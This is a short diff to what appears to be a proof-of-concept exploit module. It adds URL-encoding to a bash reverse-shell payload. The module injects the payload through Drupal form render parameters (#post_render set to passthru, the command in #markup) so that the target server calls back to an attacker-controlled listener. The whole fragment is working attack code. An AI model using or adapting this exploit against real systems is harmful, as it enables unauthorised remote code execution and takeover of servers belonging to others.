@@ -101,6 +101,7 @@ class DemoPOC(POCBase):
 
     def _shell(self):
         cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
+        cmd = urllib.parse.quote(cmd)
         url1 = self.url.rstrip(
             '/') + "?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={}".format(cmd)
         res = requests.post(url1, data=self.body_1)
